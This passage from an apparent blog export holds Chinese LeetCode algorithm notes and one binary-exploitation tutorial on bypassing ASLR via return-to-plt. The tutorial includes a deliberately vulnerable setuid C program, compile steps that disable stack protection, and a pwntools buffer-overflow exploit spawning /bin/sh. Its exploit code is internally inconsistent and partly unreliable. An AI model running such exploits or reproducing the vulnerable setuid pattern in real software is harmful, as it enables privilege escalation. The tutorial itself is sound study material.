class="keyword">and</span> nums[low] == nums[low-<span class="number">1</span>]: low += <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">threeSum</span>(<span class="params">self, nums: <span class="type">List</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="type">List</span>[<span class="type">List</span>[<span class="built_in">int</span>]]:</span><br><span class="line">        nums.sort()</span><br><span class="line">        res = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(nums)-<span class="number">2</span>):</span><br><span class="line">            <span class="keyword">if</span> nums[i] &gt; <span class="number">0</span>: <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> i &gt; <span class="number">0</span> <span class="keyword">and</span> nums[i] == nums[i-<span class="number">1</span>]: <span class="keyword">continue</span></span><br><span class="line">            tuples = self.twoSum(nums, i+<span class="number">1</span>, -nums[i])</span><br><span class="line">            <span class="keyword">for</span> tup <span class="keyword">in</span> tuples:</span><br><span class="line">                tup.append(nums[i])</span><br><span class="line">                res.append(tup)</span><br><span class="line">        <span class="keyword">return</span> res</span><br></pre></td></tr></table></figure>

<h2 id="1-两数之和"><a href="#1-两数之和" class="headerlink" title="1. 两数之和"></a><a href="https://leetcode.cn/problems/two-sum/description/">1. 两数之和</a></h2><p>这里有个小技巧：<strong>给定一个数组，当我们每次需要移动一个指针，然后遍历扫描该指针后面的数组元素的时候，其实可以用哈希表来降低算法复杂度 —— 仅需要扫一遍即可</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 输入：nums = [2,7,11,15], target = 9</span></span><br><span class="line"><span class="comment"># 输出：[0,1]</span></span><br><span class="line"><span class="comment"># 解释：因为 nums[0] + nums[1] == 9 ，返回 [0, 1] </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">twoSum</span>(<span class="params">self, nums: <span class="type">List</span>[<span class="built_in">int</span>], target: <span class="built_in">int</span></span>) -&gt; <span class="type">List</span>[<span class="built_in">int</span>]:</span><br><span class="line">        hashtable = &#123;&#125;</span><br><span class="line">        <span class="keyword">for</span> i, num <span class="keyword">in</span> <span class="built_in">enumerate</span>(nums):</span><br><span class="line">            <span class="keyword">if</span> target - num <span class="keyword">in</span> hashtable:</span><br><span class="line">                <span class="keyword">return</span> [hashtable[target-num], i]</span><br><span class="line">            hashtable[nums[i]] = i <span class="comment"># 每次在最后往哈希表里更新即可</span></span><br><span class="line">        <span class="keyword">return</span> []</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Leetcode算法笔记</category>
      </categories>
      <tags>
        <tag>Leetcode算法笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>Leetcode笔记4 - 排序算法总结</title>
    <url>/2024/03/19/leetcode-sort/</url>
    <content><![CDATA[<h1 id="Leetcode笔记4-排序算法总结"><a href="#Leetcode笔记4-排序算法总结" class="headerlink" title="Leetcode笔记4 - 排序算法总结"></a>Leetcode笔记4 - 排序算法总结</h1><p>总结一把最可能面试面到的排序：**快速排序 **和 <strong>归并排序</strong></p>
<h2 id="快速排序"><a href="#快速排序" class="headerlink" title="快速排序"></a>快速排序</h2><p><strong>核心思路</strong></p>
<ul>
<li>快速排序的思路是每次确定一个值，该值的左边都是比它小的，右边都是比它大的</li>
</ul>
<h3 id="215-数组中的第K个最大元素"><a href="#215-数组中的第K个最大元素" class="headerlink" title="215. 数组中的第K个最大元素"></a><a href="https://leetcode.cn/problems/kth-largest-element-in-an-array/">215. 数组中的第K个最大元素</a></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">findKthLargest</span>(<span class="params">self, nums: <span class="type">List</span>[<span class="built_in">int</span>], k: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        <span class="comment">## 快速排序的思路是每次确定一个值，该值的左边都是比它小的，右边都是比它大的</span></span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">partition</span>(<span class="params">nums, low, high</span>):</span><br><span class="line">            mid = (low + high) // <span class="number">2</span></span><br><span class="line">            nums[high], nums[mid] = nums[mid], nums[high]</span><br><span class="line">            </span><br><span class="line">            i = low</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(low, high):</span><br><span class="line">                <span class="keyword">if</span> nums[j] &lt;= nums[high]:</span><br><span class="line">                    nums[i], nums[j] = nums[j], nums[i]</span><br><span class="line">                    i += <span class="number">1</span></span><br><span class="line">            nums[i], nums[high] = nums[high], nums[i]</span><br><span class="line">            <span class="keyword">return</span> i</span><br><span class="line"></span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">quickSort</span>(<span class="params">nums, low, high</span>):</span><br><span class="line">            <span class="keyword">if</span> low &gt;= high:</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            pi = partition(nums, low, high)</span><br><span class="line">            quickSort(nums, low, pi-<span class="number">1</span>)</span><br><span class="line">            quickSort(nums, pi+<span class="number">1</span>, high)</span><br><span class="line">        </span><br><span class="line">        quickSort(nums, <span class="number">0</span>, <span class="built_in">len</span>(nums)-<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> nums[-k]</span><br></pre></td></tr></table></figure>



<h2 id="归并排序"><a href="#归并排序" class="headerlink" title="归并排序"></a>归并排序</h2><p><strong>核心思路</strong></p>
<ul>
<li>分成左右两个<strong>有序数组</strong>，然后要将两个数组按顺序合并好（双指针合并）</li>
<li>涉及到数组边界不清晰的时候，<strong>最好用while循环遍历数组</strong>而不用nums[low:high]的形式</li>
</ul>
<h3 id="215-数组中的第K个最大元素-1"><a href="#215-数组中的第K个最大元素-1" class="headerlink" title="215. 数组中的第K个最大元素"></a><a href="https://leetcode.cn/problems/kth-largest-element-in-an-array/">215. 数组中的第K个最大元素</a></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">findKthLargest</span>(<span class="params">self, nums: <span class="type">List</span>[<span class="built_in">int</span>], k: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        <span class="comment">## 归并排序的思路是，分成左右两个有序数组，然后要将两个数组按顺序合并好</span></span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">nums, low, mid, high</span>): <span class="comment"># 职能是将两个有序数组按顺序合并好——双指针</span></span><br><span class="line">            i, j = low, mid+<span class="number">1</span></span><br><span class="line">            res = []</span><br><span class="line">            <span class="keyword">while</span> i &lt;= mid <span class="keyword">and</span> j &lt;= high:</span><br><span class="line">                <span class="keyword">if</span> nums[i] &lt; nums[j]: </span><br><span class="line">                    res.append(nums[i])</span><br><span class="line">                    i += <span class="number">1</span></span><br><span class="line">                <span class="keyword">else</span>: </span><br><span class="line">                    res.append(nums[j])</span><br><span class="line">                    j += <span class="number">1</span></span><br><span class="line">            <span class="keyword">while</span> i &lt;= mid:</span><br><span class="line">                res.append(nums[i])</span><br><span class="line">                i += <span class="number">1</span></span><br><span class="line">            <span class="keyword">while</span> j &lt;= high:</span><br><span class="line">                res.append(nums[j])</span><br><span class="line">                j += <span class="number">1</span></span><br><span class="line">            nums[low:high+<span class="number">1</span>] = res[:]</span><br><span class="line">            </span><br><span class="line"></span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">sort</span>(<span class="params">nums, low, high</span>):</span><br><span class="line">            <span class="keyword">if</span> low &gt;= high:</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            mid = (low + high) // <span class="number">2</span></span><br><span class="line">            sort(nums, low, mid)</span><br><span class="line">            sort(nums, mid+<span class="number">1</span>, high)</span><br><span class="line">            merge(nums, low, mid, high)</span><br><span class="line">        </span><br><span class="line">        sort(nums, <span class="number">0</span>, <span class="built_in">len</span>(nums)-<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> nums[-k]</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Leetcode算法笔记</category>
      </categories>
      <tags>
        <tag>Leetcode算法笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>Leetcode笔记1 - 滑动窗口解题模板</title>
    <url>/2024/03/12/leetcode-sliding-window/</url>
    <content><![CDATA[<p>因为工作关系，coding不常用到算法，每次面试&#x2F;工作中遇到都要回忆好久。因此特意总结一些常见leetcode算法的解题模板，面试&#x2F;工作中遇到一些类似的问题可以节省很多回忆的时间。</p>
<p><strong>模板并不是所有问题的最优解，对于不同类型的问题，时间&#x2F;空间复杂度都要分别再行思考，往往会有更加精巧的解法。</strong></p>
<h1 id="Leetcode笔记1-滑动窗口"><a href="#Leetcode笔记1-滑动窗口" class="headerlink" title="Leetcode笔记1 - 滑动窗口"></a>Leetcode笔记1 - 滑动窗口</h1><p><strong>核心思路：</strong></p>
<p>​	1、<strong>扩大窗口</strong>：移动右指针，直至达到特定要求（初始最优值）的时候</p>
<p>​	2、<strong>收缩窗口</strong>：记录当前最优值，并移动左指针，直至满足扩大窗口的要求</p>
<p><strong>套路模板</strong>：</p>
<p>​	双重循环：<strong>外层循环移动右指针</strong>，<strong>里层循环移动左指针</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">left, right = <span class="number">0</span>, <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> right <span class="keyword">in</span> <span class="built_in">range</span>(n): <span class="comment">## 扩大窗口，右移右指针</span></span><br><span class="line">    <span class="comment">## 处理一些窗口相关的数据</span></span><br><span class="line">    <span class="keyword">while</span> window needs shirnk: <span class="comment">## 当达到当前最优值时，收缩窗口，右移左指针 </span></span><br><span class="line">    	<span class="comment">## 处理一些窗口相关的数据</span></span><br><span class="line">        keep.remove(s[left])</span><br><span class="line">        left += <span class="number">1</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">## 一轮结束，开始新一轮扩大窗口</span></span><br><span class="line">    <span class="comment">## 处理一些窗口相关的数据</span></span><br><span class="line">    keep.add(s[right])</span><br><span class="line">    </span><br></pre></td></tr></table></figure>



<h2 id="3-无重复字符的最长子串"><a href="#3-无重复字符的最长子串" class="headerlink" title="3. 无重复字符的最长子串"></a><a href="https://leetcode.cn/problems/longest-substring-without-repeating-characters/">3. 无重复字符的最长子串</a></h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 给定一个字符串 s ，请你找出其中不含有重复字符的最长子串的长度。</span></span><br><span class="line"><span class="comment"># 输入: s = &quot;abcabcbb&quot;</span></span><br><span class="line"><span class="comment"># 输出: 3 </span></span><br><span class="line"><span class="comment"># 解释: 因为无重复字符的最长子串是 &quot;abc&quot;，所以其长度为 3。</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">lengthOfLongestSubstring</span>(<span class="params">self, s: <span class="built_in">str</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> s:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        keep = <span class="built_in">set</span>()</span><br><span class="line">        left, cur_len, max_len, n = <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="built_in">len</span>(s)</span><br><span class="line">        <span class="keyword">for</span> right <span class="keyword">in</span> <span class="built_in">range</span>(n): <span class="comment">## 扩大窗口，右移右指针</span></span><br><span class="line">            cur_len += <span class="number">1</span>	<span class="comment">## 处理一些窗口相关的数据：记录当前字符串长度</span></span><br><span class="line">            <span class="keyword">while</span> s[right] <span class="keyword">in</span> keep: <span class="comment">## 当遇到重复字符时，收缩窗口，右移左指针</span></span><br><span class="line">                <span class="comment">## 处理一些窗口相关的数据：</span></span><br><span class="line">                <span class="comment">## 右移左指针（之前要先删掉窗口里的元素）</span></span><br><span class="line">                <span class="comment">## 当前长度 - 1</span></span><br><span class="line">                keep.remove(s[left]) </span><br><span class="line">                left += <span class="number">1</span></span><br><span class="line">                cur_len -= <span class="number">1</span></span><br><span class="line">            <span class="comment">## 一轮结束，需要维护最大长度值，并且增加窗口元素</span></span><br><span class="line">            max_len = <span class="built_in">max</span>(max_len, cur_len)</span><br><span class="line">            keep.add(s[right])</span><br><span class="line">        <span class="keyword">return</span> max_len</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="209-长度的最小子数组"><a href="#209-长度的最小子数组" class="headerlink" title="209. 长度的最小子数组"></a><a href="https://leetcode.cn/problems/minimum-size-subarray-sum/">209. 长度的最小子数组</a></h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 给定一个含有 n 个正整数的数组和一个正整数 target。找出该数组中满足其总和大于等于 target 的长度最小的 连续子数组[numsl, numsl+1, ..., numsr-1, numsr] ，并返回其长度。如果不存在符合条件的子数组，返回 0 。</span></span><br><span class="line"><span class="comment"># 输入：target = 7, nums = [2,3,1,2,4,3]</span></span><br><span class="line"><span class="comment"># 输出：2</span></span><br><span class="line"><span class="comment"># 解释：子数组 [4,3] 是该条件下的长度最小的子数组。</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">minSubArrayLen</span>(<span class="params">self, target: <span class="built_in">int</span>, nums: <span class="type">List</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        left, n = <span class="number">0</span>, <span class="built_in">len</span>(nums)</span><br><span class="line">        min_len = n + <span class="number">1</span></span><br><span class="line">        sum_ = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> right <span class="keyword">in</span> <span class="built_in">range</span>(n): <span class="comment">## 扩大窗口，右移右指针</span></span><br><span class="line">            sum_ += nums[right] <span class="comment">## 求窗口的和</span></span><br><span class="line">            <span class="keyword">while</span> sum_ &gt;= target: <span class="comment">## 当和大于等于target时，收缩窗口，右移左指针</span></span><br><span class="line">                min_len = <span class="built_in">min</span>(min_len, right + <span class="number">1</span> - left) <span class="comment">## 记录最小的窗口长度</span></span><br><span class="line">                <span class="comment">## 右移左指针，当前长度-1</span></span><br><span class="line">                sum_ -= nums[left] </span><br><span class="line">                left += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> min_len == n + <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        <span class="keyword">return</span> min_len</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Leetcode算法笔记</category>
      </categories>
      <tags>
        <tag>Leetcode算法笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>二进制学习笔记1-ASLR绕过</title>
    <url>/2024/03/21/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01-ASLR%E7%BB%95%E8%BF%87/</url>
    <content><![CDATA[<h1 id="二进制保护机制原理和绕过技巧"><a href="#二进制保护机制原理和绕过技巧" class="headerlink" title="二进制保护机制原理和绕过技巧"></a>二进制保护机制原理和绕过技巧</h1><h2 id="0x00-工具"><a href="#0x00-工具" class="headerlink" title="0x00 工具"></a>0x00 工具</h2><ul>
<li><strong>peda</strong></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/longld/peda.git ~/peda</span><br><span class="line">echo &quot;source ~/peda/peda.py&quot; &gt;&gt; ~/.gdbinit</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>readelf</strong></li>
</ul>
<p>readelf的作用是<strong>用来查看当前elf文件的符号表</strong>，符号表中的信息只包括全局变量和函数名。 动态符号表(.synsym)用来保存与动态链接相关的导入导出符号，不包括模块内的符号；而systab表则保存所有的符号，包括.dynsym中的符号</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep system</span><br></pre></td></tr></table></figure>



<h2 id="0x01-ASLR"><a href="#0x01-ASLR" class="headerlink" title="0x01 ASLR"></a>0x01 ASLR</h2><p>ASLR（地址空间布局随机化）的原理不作详细介绍，它可以将进程内的某些内存地址进行随机化来加大入侵难度。因此我们很难直接通过ret2libc成功利用漏洞。</p>
<p><strong>绕过ASLR核心点</strong> </p>
<ul>
<li>开启ASLR后，libc的<strong>基地址会变</strong>，但是<strong>函数的偏移量不会变</strong></li>
<li>system 函数地址 &#x3D; libc基地址 + 函数偏移量</li>
</ul>
<p><img src="https://pic.imgdb.cn/item/65fc5d2f9f345e8d03706af0.png"></p>
<p><img src="https://pic.imgdb.cn/item/65fc5d309f345e8d03706da2.png"></p>
<h2 id="0x02-return-to-plt技术"><a href="#0x02-return-to-plt技术" class="headerlink" title="0x02 return-to-plt技术"></a>0x02 return-to-plt技术</h2><h3 id="2-1-背景知识"><a href="#2-1-背景知识" class="headerlink" title="2.1 背景知识"></a>2.1 背景知识</h3><p>在介绍这一技术前，先了解一下Linux内存布局、静态函数库和动态函数库（共享函数库）的区别以及PIC。</p>
<h4 id="2-1-1-Linux内存布局"><a href="#2-1-1-Linux内存布局" class="headerlink" title="2.1.1 Linux内存布局"></a>2.1.1 Linux内存布局</h4><p><img src="https://pic.imgdb.cn/item/65fc5d309f345e8d03706c09.png"></p>
<ul>
<li>.text 汇编代码</li>
<li>.data 无初始值的数据（静态变量，全局变量）</li>
<li>.bss 有初始值的数据 （静态变量，全局变量）</li>
<li>heap 堆</li>
<li>shared object 共享对象区域（动态库所在）</li>
<li>stack 栈</li>
<li>kernel-area 内核区域</li>
</ul>
<h5 id="2-1-2-静态函数库与动态函数库"><a href="#2-1-2-静态函数库与动态函数库" class="headerlink" title="2.1.2 静态函数库与动态函数库"></a>2.1.2 静态函数库与动态函数库</h5><p>静态函数库 —— 在程序运行前就已经被加载到目标程序里了</p>
<p>动态函数库 —— 在程序启动的时候被加载</p>
<p>不同于静态库的是，<strong>共享库的text段在多个进程间共享</strong>，<strong>但它的数据段在每个进程中是唯一的</strong>。这样设计可以减少内存和磁盘空间。正是text段在多个进程间共享，其必须只有读和执行权限。没有了写权限，动态链接器不能在text段内部重定位数据描述符(data symbol)或者函数地址。这样一来，程序运行期间，动态链接器是如何在不修改text段的情况下，重定位共享库描述符的呢? 利用PIC! [4] </p>
<p><font color=red><strong>这句话非常重要！</strong></font></p>
<h5 id="2-1-3-PIC（位置独立代码）"><a href="#2-1-3-PIC（位置独立代码）" class="headerlink" title="2.1.3 PIC（位置独立代码）"></a>2.1.3 PIC（位置独立代码）</h5><p>位置无关代码是指代码无论被加载到哪个地址上都可以正常执行。gcc选项中添加-fPIC会产生相关代码。</p>
<p>共享库的text段会指向数据段中的一个特定表，这个表用来存放全局描述符和函数的绝对虚拟地址。动态链接器作为重定位的一部分会填充这个表。因此，在重定位时，只有数据段被修改，而text段依然完好无顺。</p>
<p><strong>简言之，既然我们想让共享函数库被多个进程共享，就要让它的.text段中的数据描述符和函数地址能被重定位。可是由于.text无法被写，我们只能通过PIC来间接寻址完成！</strong></p>
<h3 id="2-2-GOT（全局偏移表）-PLT（过程链接表）"><a href="#2-2-GOT（全局偏移表）-PLT（过程链接表）" class="headerlink" title="2.2 GOT（全局偏移表）&amp; PLT（过程链接表）"></a>2.2 GOT（全局偏移表）&amp; PLT（过程链接表）</h3><h4 id="2-2-1-GOT"><a href="#2-2-1-GOT" class="headerlink" title="2.2.1 GOT"></a>2.2.1 GOT</h4><p>全局偏移表为每个全局变量分配一个4字节的表项，这4个字表项中含有全局变量的地址。当代码段中的一条指令引用一个全局变量时，这条指令指向的是GOT中的一个表项，而不是全局变量的绝对虚拟地址。当共享库被加载时，动态链接库会重定位这个GOT表项。因此，PIC利用GOT通过一层间接寻址来重定位全局描述符。</p>
<h4 id="2-2-1-PLT"><a href="#2-2-1-PLT" class="headerlink" title="2.2.1 PLT"></a>2.2.1 PLT</h4><p>过程链接表含有每个全局函数的存根代码。text段中的一条call指令不会直接调用这个函数(‘function’)，而是调用这个存根代码(function@PLT)。<strong>存根代码在动态链接器的帮助下，解析函数地址</strong>并将其拷贝到GOT(GOT[n])中。**解析过程只发生在第一次调用函数(‘function’)的时候，之后代码段中的call指令调用存根代码(function@PLT)而不是调用动态链接器去解析函数地址(‘function’)**。存根代码直接从GOT(GOT[n])获取函数地址并跳转到那里。因此，PIC利用PLT通过两层间接寻址来重定位函数地址。</p>
<p>简言之：</p>
<ul>
<li>第一次调用function时，动态链接器会解析function的地址，并拷贝到GOT(GOT(n))中</li>
<li>以后再次调用function时，只会调用存根代码(function@PLT)，而不会再次解析function的地址</li>
<li>存根代码会从GOT(GOT[n])里获取地址并跳转</li>
</ul>
<p><strong>两层间接寻址：function@PLT -&gt; GOT(GOT(n)) -&gt; function addr</strong></p>
<h2 id="0x03-漏洞利用"><a href="#0x03-漏洞利用" class="headerlink" title="0x03 漏洞利用"></a>0x03 漏洞利用</h2><h3 id="3-1-漏洞代码"><a href="#3-1-漏洞代码" class="headerlink" title="3.1 漏洞代码"></a>3.1 漏洞代码</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span> </span></span><br><span class="line"><span class="type">void</span> <span class="title function_">shell</span><span class="params">()</span> &#123;      <span class="comment">//这个函数在啊程序中并没有直接执行，但是为了后续的寻找plt进行漏洞利用，需要编译它</span></span><br><span class="line"></span><br><span class="line"> system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line"> <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span> &#123;</span><br><span class="line"> <span class="type">int</span> i=<span class="number">0</span>;</span><br><span class="line"> <span class="type">char</span> buf[<span class="number">256</span>];</span><br><span class="line"> <span class="built_in">strcpy</span>(buf,argv[<span class="number">1</span>]);</span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,buf);</span><br><span class="line"> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="3-2-编译"><a href="#3-2-编译" class="headerlink" title="3.2 编译"></a>3.2 编译</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="built_in">echo</span> 2 &gt; /proc/sys/kernel/randomize_va_space</span> </span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">gcc -g -fno-stack-protector -o vuln vuln.c</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">sudo <span class="built_in">chown</span> root vuln</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">sudo <span class="built_in">chgrp</span> root vuln</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">sudo <span class="built_in">chmod</span> +s vuln</span></span><br></pre></td></tr></table></figure>



<h3 id="3-3-调试"><a href="#3-3-调试" class="headerlink" title="3.3 调试"></a>3.3 调试</h3><p>查看main函数的汇编</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">gdb-peda$ </span><span class="language-bash">disassemble main</span></span><br><span class="line">Dump of assembler code for function main:</span><br><span class="line">   0x000000000000118b &lt;+0&gt;:     push   rbp</span><br><span class="line">   0x000000000000118c &lt;+1&gt;:     mov    rbp,rsp</span><br><span class="line">   0x000000000000118f &lt;+4&gt;:     sub    rsp,0x120</span><br><span class="line">   0x0000000000001196 &lt;+11&gt;:    mov    DWORD PTR [rbp-0x114],edi</span><br><span class="line">   0x000000000000119c &lt;+17&gt;:    mov    QWORD PTR [rbp-0x120],rsi</span><br><span class="line">   0x00000000000011a3 &lt;+24&gt;:    mov    DWORD PTR [rbp-0x4],0x0</span><br><span class="line">   0x00000000000011aa &lt;+31&gt;:    mov    rax,QWORD PTR [rbp-0x120]</span><br><span class="line">   0x00000000000011b1 &lt;+38&gt;:    add    rax,0x8</span><br><span class="line">   0x00000000000011b5 &lt;+42&gt;:    mov    rdx,QWORD PTR [rax]</span><br><span class="line">   0x00000000000011b8 &lt;+45&gt;:    lea    rax,[rbp-0x110]</span><br><span class="line">   0x00000000000011bf &lt;+52&gt;:    mov    rsi,rdx</span><br><span class="line">   0x00000000000011c2 &lt;+55&gt;:    mov    rdi,rax</span><br><span class="line">   0x00000000000011c5 &lt;+58&gt;:    call   0x1030 &lt;strcpy@plt&gt;</span><br><span class="line">   0x00000000000011ca &lt;+63&gt;:    lea    rax,[rbp-0x110]</span><br><span class="line">   0x00000000000011d1 &lt;+70&gt;:    mov    rdi,rax</span><br><span class="line">   0x00000000000011d4 &lt;+73&gt;:    call   0x1040 &lt;puts@plt&gt;</span><br><span class="line">   0x00000000000011d9 &lt;+78&gt;:    mov    eax,0x0</span><br><span class="line">   0x00000000000011de &lt;+83&gt;:    leave  </span><br><span class="line">   0x00000000000011df &lt;+84&gt;:    ret    </span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure>

<p>查看shell函数的汇编</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">gdb-peda$ </span><span class="language-bash">disassemble shell</span></span><br><span class="line">Dump of assembler code for function shell:</span><br><span class="line">   0x0000000000001169 &lt;+0&gt;:     push   rbp</span><br><span class="line">   0x000000000000116a &lt;+1&gt;:     mov    rbp,rsp</span><br><span class="line">   0x000000000000116d &lt;+4&gt;:     lea    rax,[rip+0xe90]        # 0x2004</span><br><span class="line">   0x0000000000001174 &lt;+11&gt;:    mov    rdi,rax</span><br><span class="line">   0x0000000000001177 &lt;+14&gt;:    mov    eax,0x0</span><br><span class="line">   0x000000000000117c &lt;+19&gt;:    call   0x1050 &lt;system@plt&gt;</span><br><span class="line">   0x0000000000001181 &lt;+24&gt;:    mov    edi,0x0</span><br><span class="line">   0x0000000000001186 &lt;+29&gt;:    call   0x1060 &lt;exit@plt&gt;</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure>

<p>找到’&#x2F;bin&#x2F;sh’的地址</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">gdb-peda$ </span><span class="language-bash">find <span class="string">&#x27;/bin/sh&#x27;</span></span></span><br><span class="line">Searching for &#x27;/bin/sh&#x27; in: None ranges</span><br><span class="line">Found 3 results, display max 3 items:</span><br><span class="line">     vuln : 0x564f073e3004 --&gt; 0x68732f6e69622f (&#x27;/bin/sh&#x27;)</span><br><span class="line">     vuln : 0x564f073e4004 --&gt; 0x68732f6e69622f (&#x27;/bin/sh&#x27;)</span><br><span class="line">libc.so.6 : 0x7fe9a4c99117 --&gt; 0x68732f6e69622f (&#x27;/bin/sh&#x27;)</span><br></pre></td></tr></table></figure>



<h3 id="3-4-EXP"><a href="#3-4-EXP" class="headerlink" title="3.4 EXP"></a>3.4 EXP</h3><p>exp的构造，首先向缓冲区中填充256个字节的‘A’ + 向对齐空间中填充16字节的‘A’ + system@PLT的地址 + exit@PLT的地址 + system_arg的地址。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">system = <span class="number">0x1050</span></span><br><span class="line">exit = <span class="number">0x1060</span></span><br><span class="line">system_arg = <span class="number">0x559e0dd67004</span></span><br><span class="line">payload=<span class="string">&quot;A&quot;</span> * <span class="number">272</span>+p32(system)+p32(exit)+p32(system_arg)</span><br><span class="line"><span class="built_in">print</span> payload</span><br><span class="line">io= process(argv=[<span class="string">&#x27;./vuln&#x27;</span>, payload])</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="0x04-参考"><a href="#0x04-参考" class="headerlink" title="0x04 参考"></a>0x04 参考</h2><p>[1] <a href="https://gxkyrftx.github.io/2019/03/02/%E7%BB%95%E8%BF%87ASLR-%E4%B8%80/">绕过ASLR-一</a></p>
<p>[2] <a href="https://lantern.cool/note-pwn-linux-protect/index.html">Linux常用保护机制</a></p>
<p>[3] <a href="https://darkwing.moe/2019/02/21/Pwn%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B02-%E5%86%85%E5%AD%98%E5%B8%83%E5%B1%80/">Pwn学习笔记2-内存布局</a></p>
<p>[4] <a href="https://diting0x.github.io/20170101/bypassaslr-returntoplt/">bypassaslr-returntoplt</a></p>
]]></content>
      <categories>
        <category>二进制学习笔记</category>
      </categories>
      <tags>
        <tag>二进制学习笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>Leetcode笔记7 - 栈结构总结</title>
    <url>/2024/03/22/leetcode-stack/</url>
    <content><![CDATA[<h1 id="Leetcode笔记7-栈结构总结"><a href="#Leetcode笔记7-栈结构总结" class="headerlink" title="Leetcode笔记7 - 栈结构总结"></a>Leetcode笔记7 - 栈结构总结</h1><p>栈的特点是：先进后出，后进先出。</p>
<p>遇到需要先进后出的题，优先考虑栈结构。例如：匹配括号等。</p>
